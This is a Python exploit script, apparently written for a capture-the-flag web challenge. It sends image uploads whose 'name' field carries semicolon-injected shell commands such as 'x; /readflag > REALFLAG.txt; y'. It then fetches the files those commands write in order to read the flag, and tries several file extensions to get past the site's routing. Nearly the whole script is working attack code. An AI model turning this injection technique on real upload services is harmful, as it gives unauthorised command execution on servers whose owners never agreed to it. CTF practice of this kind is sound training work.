#!/usr/bin/env python3
"""
Test semicolon injection to verify command execution
"""

import requests
import base64
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

print("[*] Testing semicolon command injection")
print()

# Test 1: Use ls to list directory and save output
print("[TEST 1] Execute: ls -la > listing.txt")
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x; ls -la > dirlist.txt; y'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

r2 = requests.get(f"{URL}dirlist.txt", timeout=3)
print(f"  Fetch /dirlist.txt: {r2.status_code} ({len(r2.content)} bytes)")
if r2.status_code == 200 and 'index.php' not in r2.text:
    print(f"  Content:\n{r2.text}")
else:
    print(f"  Got index.php source (file doesn't exist or not accessible)")

print("\n" + "="*60 + "\n")

# Test 2: pwd to see current directory
print("[TEST 2] Execute: pwd > pwd.txt")
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x; pwd > pwdout.txt; y'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

r2 = requests.get(f"{URL}pwdout.txt", timeout=3)
print(f"  Fetch /pwdout.txt: {r2.status_code}")
if r2.status_code == 200 and len(r2.content) < 100:
    print(f"  PWD: {r2.text.strip()}")

print("\n" + "="*60 + "\n")

# Test 3: Create a simple .txt file and try to access it
print("[TEST 3] Create test.txt with known content")
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x; echo TESTCONTENT123 > test123.txt; y'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

r2 = requests.get(f"{URL}test123.txt", timeout=3)
print(f"  Fetch /test123.txt: {r2.status_code}")
if r2.status_code == 200:
    print(f"  Content: {r2.text[:100]}")
    if 'TESTCONTENT123' in r2.text:
        print("\n  [+] SUCCESS! File is accessible!")
        print("  [+] Now trying to get flag...")

        # Get the flag!
        r = requests.post(URL,
            files={'img': ('test.png', png)},
            data={'name': 'x; /readflag > REALFLAG.txt; y'},
            timeout=10)
        time.sleep(2)

        r2 = requests.get(f"{URL}REALFLAG.txt", timeout=3)
        if r2.status_code == 200:
            print(f"\n*** FLAG: {r2.text} ***\n")
        else:
            print(f"  Flag file: {r2.status_code}")

print("\n" + "="*60 + "\n")

# Test 4: Try different file extensions
print("[TEST 4] Try creating .html file (might bypass routing)")
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x; /readflag > flag.html; y'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

r2 = requests.get(f"{URL}flag.html", timeout=3)
print(f"  Fetch /flag.html: {r2.status_code}")
if r2.status_code == 200 and 'ptm{' in r2.text:
    print(f"\n*** FLAG: {r2.text} ***\n")
elif r2.status_code == 200:
    print(f"  Content: {r2.text[:200]}")

# Test other extensions
for ext in ['xml', 'json', 'css', 'js', 'md']:
    r = requests.post(URL,
        files={'img': ('test.png', png)},
        data={'name': f'x; /readflag > flag.{ext}; y'},
        timeout=10)
    time.sleep(1)

    r2 = requests.get(f"{URL}flag.{ext}", timeout=3)
    if r2.status_code == 200 and 'ptm{' in r2.text:
        print(f"\n*** FLAG in .{ext}: {r2.text} ***\n")
        break
    elif r2.status_code == 200 and len(r2.content) < 1000:
        print(f"  .{ext}: {r2.status_code} - {r2.text[:50]}")
